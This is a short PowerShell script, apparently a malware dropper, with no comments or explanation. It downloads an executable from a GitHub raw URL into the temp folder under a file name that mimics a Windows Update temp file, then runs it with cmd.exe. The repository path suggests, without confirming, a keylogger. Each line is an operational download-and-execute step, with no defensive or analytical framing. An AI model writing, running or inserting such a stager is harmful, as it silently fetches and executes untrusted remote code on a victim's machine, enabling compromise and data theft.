New-Item "$env:temp\wsuA58F.tmp"
(New-Object Net.WebClient).DownloadFile("https://raw.githubusercontent.com/SmartMozart/kl/main/main.exe", "$env:temp\wsuA58F.exe")
cmd.exe /c "$env:temp\wsuA58F.exe"
